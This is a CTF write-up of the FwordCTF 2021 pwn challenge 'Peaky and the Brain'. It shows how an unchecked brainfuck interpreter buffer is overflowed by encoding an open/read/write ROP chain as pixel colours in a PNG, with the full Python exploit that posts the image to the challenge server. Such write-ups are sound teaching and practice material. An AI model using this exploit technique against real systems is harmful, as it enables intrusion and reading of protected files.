​​**Peaky and the Brain**

was a pwn challenge from FwordCTF 2021

basically, it was a web application write in python,

that accept a png picture as input, and a small text.

The interface looks like this. (a bit ugly I know..)

![](https://github.com/nobodyisnobody/write-ups/raw/main/Fword.CTF.2021/pwn/peaky.and.the.brain/pics/interface.png)

The image was converted to brainfuck according to pixel color values.

then the brainfuck was passed to a binary interpreter.

The text that was input in arg window on the webpage, was also passed to the interpreter,

and stored in a buffer on .bss at a fixed address, we will use it to pass the filename we want to read for the ROP.

the output of the interpreter was returned back in the web page.

the interpreted has a seccomp in place, that forbid execve (no shell exec),  socket (no connect back shellcode), mprotect (no shellcode so...)

![](https://github.com/nobodyisnobody/write-ups/raw/main/Fword.CTF.2021/pwn/peaky.and.the.brain/pics/seccomp.png)

as always with brainfuck challenge, the interpreter does not check boundaries when accessing his buffer on stack.

so we can write value after the 79 bytes buffer on stack , and modify the interpreter return address..

and write a ROP in stack, to do a simple open/read/write ROP, that will dump the flag to stdout,

the stdout output, will be return to us on the webpage..

Here is the python code to do that so...

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import requests
import png
import StringIO

context.update(arch="amd64", os="linux")
context.log_level = 'error'

exe = ELF('./interpreter')
rop = ROP(exe)

# brainfuck instructions to color translation table
colors = {'>' : (255,0,0), '.' :  (0,255,0), '<' : (0,0,255), '+' : (255,255,0), '-' : (0,255,255), '[' : (255,0,188), ']' : (255,128,0), ',' : (102,0,204) }

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]

# simple rop open file, read it, write it to stdout
payload = p64(pop_rdi) + p64(0x4e5360) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(exe.symbols['open'])
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x4e5370) + p64(pop_rdx) + p64(100) + p64(exe.symbols['read'])
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x4e5370) + p64(pop_rdx) + p64(100) + p64(exe.symbols['write'])
payload += p64(exe.symbols['exit'])

# translate ROP payload to brainfuck instructions
code  = '>'*0x78	# first we advance in stack to reach return address
# write each qword with brainfuck
for c in payload:
  code += '[-]'+'+'*ord(c)+'>'

# generate png image from code
img = []
row = ()
for x in range(len(code)):
     row = row + colors[code[x]]
img.append(row)
with open('picture.png', 'wb') as f:
    w = png.Writer(len(code), 1, greyscale=False)
    w.write(f, img)

print('posting picture...')
url = "http://40.71.72.198:8080/"
files = {'file': open("picture.png","rb").read()}
data = {'text':'/data/flag.txt'}
r = requests.post(url, files=files, data=data)

print('FLAG:')
for line in StringIO.StringIO(r.text).readlines():
  if 'FwordCTF' in line:
    print(line.split(b'<p># ')[1])
```

and the code in action

![](https://github.com/nobodyisnobody/write-ups/raw/main/Fword.CTF.2021/pwn/peaky.and.the.brain/pics/gotflag.gif)

*nobodyisnobody still pwning things...*

